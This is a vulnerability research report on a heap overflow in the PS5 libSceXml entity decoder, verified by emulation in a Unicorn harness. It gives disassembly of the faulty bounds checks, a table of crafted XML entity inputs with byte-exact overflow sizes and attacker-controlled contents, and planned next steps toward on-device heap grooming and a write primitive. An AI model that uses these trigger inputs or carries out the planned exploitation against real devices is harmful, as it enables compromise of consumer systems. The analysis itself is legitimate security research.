# STAGE 3B — libSceXml decoder 0x115b0: byte-exact overflow proof by emulation

Companion to STAGE3-libSceXml-heap-overflow.md (static root cause). This report
is the completed Phase-2 verification: the vulnerable decoder is executed for
real inside Unicorn with the sprx segments loaded, malloc/free "thunked" to a
tracking allocator, and every out-of-bounds write measured byte-exactly.

Status: **22/22 PASS** (all expectations reproduced exactly). The overflow is
real, deterministic, and its extent/content is fully attacker-controlled.

---

## 1. Result summary

| metric | value |
|---|---|
| vulnerable function | `0x115b0` entity text decoder, libSceXml.sprx 12.70 |
| vulnerable types | 5 (unknown entity `&name;`), 6 (char ref `&#...;` — even VALID refs) |
| safe types | 0–4 (predefined lt/gt/amp/quot/apos), 7 (invalid char ref -> error) |
| out buffer | malloc(0x14), cap 0x14, grows +0x14 (0x136c0), NUL-terminated after each append |
| name buffer | malloc(0x14), cap 0x14, grows +0x14, NUL-terminated after each append |
| copy length | **NAME CAP** (0x14 = 20 bytes minimum, grows with name length) |
| broken grow predicate | `OUT CAP + NAME CAP > OUT LEN` (must be `OUT LEN + NAME CAP <= OUT CAP`) |
| broken length accounting | copied `NAME CAP` bytes, `OUT LEN += NAME LEN` only |
| measured worst case | **41 bytes** past a 0x14-byte allocation (type 5, 40-char name, outlen 0x14) |
| max type-6 overflow | 20 bytes past 0x14 (outlen = cap) |
| first N overflow bytes | fully attacker-controlled (the entity name itself) |

## 2. Repro

```
/tmp/opencode/lscexml-verify/
  emu_decoder.py        harness + test matrix (22 cases)
  evidence/             disassemblies of every function involved
  evidence/phase2_proof_transcript.txt
.venv/bin/python emu_decoder.py     # -> == 22 OK / 0 FAIL ==
```

Requires: python unicorn (>= 2.x), the 12.70 sprx.
`/home/user/Documents/webp5/ps5-libs/unp/12.70/system/common/lib/libSceXml.sprx`

## 3. Method

### 3.1 Environment

The sprx is an ELF with no section headers; segments were mapped manually:

```
VA 0x00000                  text (RX, loaded from file @0x4000)
VA 0x18000 / 0x20000 / 0x24000   rodata / data+BSS / data2+rodata2
canary slot: 0x20330 -> 0x51200000 (mirrors loader population)
predefined-entity slots 0x24028-0x24078 <- loader-populated ptrs (mirrored)
parser struct @0x51300000  (err code written to +0x110)
String {cap@+0x4, len@+0xc, ptr@+0x18} @0x51400000, input at +0x100
stack @0x7ffff00000 (note: task88's tail-call returns to 0x0 on entry)
```

Entry: `0x115b0(PARSER=rsi..., STRING=rsi)` called with `emu_start(0x115b0, 0x119b5)`,
the return address pushed on the guest stack. Exit taken at the canary-checked
epilogue (0x1197d frees name, 0x11997 frees out).

### 3.2 Heap thunks

`malloc(0xffe0)` / `free(0xfff0)` / `memcpy(0x16c80)` are emulated in Python:

- each allocation gets a private 0x1000 data page
- the NEXT 0x1000 page stays unmapped -> any write past the requested size
  would fault immediately (hard boundary)
- a code hook on `0xffe0` records `(addr, size)` in allocation order and
  returns the bump address; `free` is a no-op; `memcpy` is a Python bytes copy
- a write hook (`UC_HOOK_MEM_WRITE`) records the highest written address per
  allocation page (`wmax`): overflow size = `wmax - (addr + size)` for the
  worst allocation in the run

This measures the write extent **byte-exactly** without needing the real
allocator, and independently of size-field corruption.

### 3.3 What the decoder really does (from live tracing, not guesswork)

Guest stack frame (decoder 0x115b0):

```
-0x30 canary copy   -0x34 OUT CAP (0x14)   -0x38 OUT LEN
-0x40 OUT PTR       -0x44 NAME CAP (0x14)  -0x48 NAME LEN
-0x50 NAME PTR      -0x58 saved parser
```

State machine (eax): `0` = plain text, `1` = inside entity.
- `0x11663/0x11677` fetch next input byte; if eax==0 and byte=='&' -> enter
  entity (skip char), eax=1.
- eax==1 and byte==';' -> call mapper (0x119c0) with `rsi = &{NAME PTR,
  NAME LEN}` on the stack; dispatch on returned type:
  - 0..4 predefined entity -> `out[len] = rep_char; len++` (checked, safe)
  - 6 char ref   -> copy loop (0x117e0) **NAME CAP** bytes from name buf
    into `out[OUT LEN ..]`
  - 5 (anything else) -> append '&' (checked), copy **NAME CAP** bytes
    (loop 0x11890), NUL, append ';' (checked)
  - 7 parse error -> function returns 0x8085000b
- name chars accumulate at 0x11746+ with a CORRECT check (`NAME CAP > LEN` +
  grow via 0x136c0)
- plain chars accumulate at 0x11710+ with a CORRECT check (`OUT CAP > LEN` +
  grow)

The mapper (0x119c0) for `#...` refs: parses hex (`0x15d60`) or decimal
(`0x15d20`) into a local code point, then `validate_0x15c00` encodes it as
UTF-8 **into the name buffer** (`name[0..k]`, NUL-terminated, `NAME LEN=k`)
and returns 6; rejects surrogates / <0x9 / noncharacters / >0x10FFFF with
type 7. Note: this means even a perfectly valid ref like `&#x41;` takes the
vulnerable type-6 path.

### 3.4 The two bugs, in one instruction each

Type-6 path grow check (0x1178c–0x117c6, same shape at 0x11849 for type 5
and 0x116cc for the predefined path):

```
0x11794: mov -0x44(%rbp),%edx      ; edx = NAME CAP
0x11797: mov -0x38(%rbp),%ecx      ; ecx = OUT LEN
0x1179a: add %edx,%esi             ; esi = OUT CAP + NAME CAP
0x1179c: cmp %ecx,%esi             ; OUT CAP + NAME CAP vs OUT LEN
0x1179e: jg  0x117c6               ; > OUT LEN -> copy WITHOUT growing
```

The correct predicate for skipping the grow is `OUT LEN + NAME CAP <= OUT CAP`
(= compare `OUT CAP` against `OUT LEN + NAME CAP`). As written, `OUT CAP +
NAME CAP > OUT LEN` is almost always true (OUT LEN <= OUT CAP), so growth is
skipped and the copy at 0x117e0 runs with capacity `NAME CAP`:

```
0x117eb: cmp -0x44(%rbp),%ecx      ; loop while i < NAME CAP
0x117ee: jl  0x117e0               ; writes out[OUT LEN + i]
```

Length accounting afterwards adds only `NAME LEN` (0x117f7), never the copied
`NAME CAP` bytes. The NUL placed at `out[OUT LEN + NAME LEN]` (0x118b4 on the
type-5 path) is written after the copy, extending the overflow one byte more.

Worst-case overflow, type 5, attacker-controlled:

```
OUT LEN + NAME CAP + 1 - OUT CAP      bytes past the allocation
```

## 4. Trigger matrix — measured, byte-exact

Inputs are fed directly to the decoder (entity code in attribute values/text
content, reachable via both parse() APIs — see STAGE3). "ovf" = bytes past the
allocation of the out buffer (worst allocation of the run).

| case | input | err | ovf | last write | comment |
|---|---|---|---|---|---|
| ctrl_empty | `` | 0 | 0 | - | no input |
| ctrl_plain | `A` | 0 | 0 | - | plain text |
| ctrl_predef | `A&amp;` | 0 | 0 | - | type 0, safe |
| ctrl_charref | `&#x41;` | 0 | 0 | - | type 6, outlen=0 fits exactly |
| t5_min | `&zz;` | 0 | 1 | +0x15 | type 5 at outlen=1 |
| t5_1 | `A&zz;` | 0 | 2 | +0x16 | copy at out[2..0x16) |
| t5_19 | `A`*19+`&zz;` | 0 | 20 | +0x28 | outlen 0x13->'&'->0x14=cap |
| t5_20 | `A`*20+`&zz;` | 0 | 1 | +0x15 | '&' grows buf to 0x28, copy at [0x15..0x29) |
| t5_long | `A`*19+`&`+`z`*40+`;` | 0 | 41 | +0x3d | namecap 0x28; 40 bytes copy + ';' |
| t5_compound | `A&zz;A&zz;` | 0 | 7 | +0x1b | two entities, 2nd copy at out[7] |
| t5_max | `A`*20+`&`+`z`*40+`;` | 0 | 22 | +0x3e | out grown to 0x28, copy 0x28 bytes + ';' |
| t6_1 | `A&#x41;` | 0 | 1 | +0x15 | valid ref, outlen=1 |
| t6_19 | `A`*19+`&#x41;` | 0 | 19 | +0x27 | outlen 0x13 |
| t6_20 | `A`*20+`&#x41;` | 0 | 20 | +0x28 | outlen 0x14 = cap (max type-6) |
| t6_dec | `A&#65;` | 0 | 1 | +0x15 | decimal ref -> 'A' |
| t6_utf8 | `A`*20+`&#x80;` | 0 | 20 | +0x28 | UTF-8 seq `\xc2\x80` written into name |
| t7_badhex | `&#xGG;` | 0x8085000b | 0 | - | error path, no copy |
| t7_surrogate | `A&#xD800;` | 0x8085000b | 0 | - | surrogate rejected |
| t7_low | `A&#0;` | 0x8085000b | 0 | - | cp<0x9 rejected |
| t7_big | `A&#x110000;` | 0x8085000b | 0 | - | cp>0x10FFFF rejected |
| t7_empty | `&#;` | 0x8085000b | 0 | - | no digits |
| unterm | `A&zz` | 0x80850015 | 0 | - | ';' never comes |

## 5. Observed overflow content (evidence)

- t5_19 (`A`*19+`&zz;`), out size 0x14: overflow = `zz` + NUL + 17 zero bytes
  — the attacker name lands first, then the stale/zero tail of the name buffer.
- t6_20 (`A`*20+`&#x41;`): overflow = `A\x00` + `41` + NUL + 16 zeros.
  `A\x00` is the UTF-8 encoding of cp=0x41 written into the name buffer by
  validate (0x15c00); `41` is the STALE byte of the original name `#x41`
  beyond the rewrites — i.e. the type-6 spill also discloses uninitialized
  heap content to whatever reads the overrun region later.
- t6_utf8 (`A`*20+`&#x80;`): overflow = `\xc2\x80` + NUL + stale `0` + NUL...
  (2-byte UTF-8 encoding visible).
- t5_long / t5_max: the 40-char name copied verbatim (`z`*40 + NUL...) — the
  classic attacker-controlled heap overflow.

## 6. Implications

- Overflow extent = `OUT LEN + NAME CAP + 1 - OUT CAP`: with the out buffer
  full (any text length multiple of 0x14), the copy is the whole name
  allocation up to whatever the name grew to (0x14 x n — name length is
  bounded only by the input size), plus one byte for the NUL / ';'.
- Content: first `NAME LEN` bytes = the entity name (attacker-controlled,
  arbitrary bytes except `&`/`;` flow constraints), then NUL + heap memory.
- The out buffer is freed at decoder exit (0x11997 -> 0xfff0): practical
  targets are heap chunk metadata (FreeList/block headers of libc-like
  allocators) and adjacent live objects in `sce::Xml` states — from a single
  entity in any attribute value or text decoded by either parse() API.
- Repeated entities re-trigger on the same buffer while `OUT LEN` stays in
  the window; compounding, widening corruption.
- Type 6 compounds the primitive with an info-leak flavor (stale name-buffer
  bytes) and is reachable with a VALID, well-formed reference.

## 7. Trust boundaries / limits of this proof

- The heap is a bump allocator in the harness; the real PS5 libc allocator
  will place chunks adjacently similarly (out then name, or the previous
  live object), so the overflow lands in a neighbouring chunk/object, but the
  exact chunk layout must be groomed on-device.
- The harness mirrors loader-population of slots 0x24028..0x24078 (empty in
  the on-disk dump) and the canary @0x20330; both are required for the
  decoder to run, and both are populated by the real loader.
- Predefined-entity / char-ref dispatch and error paths agree with real
  semantics (errors 0x8085000b / 0x80850015 reproduced).

## 8. Next steps (updated)

1. Phase 3 — version sweep 1.00..12.70 for the twin decoder pattern (all
   dumps in ps5-libs/unp) and the dead-code check per version.
2. Phase 4 — on-device proof & extraction to a write primitive:
   `sprx_dlopen` + call `parse()` with a crafted document; groom the adjacent
   chunk; leverage Fltk/allocator metadata.

Full test matrix and harness: /tmp/opencode/lscexml-verify/emu_decoder.py
(repro transcription: evidence/phase2_proof_transcript.txt, 22/22 OK).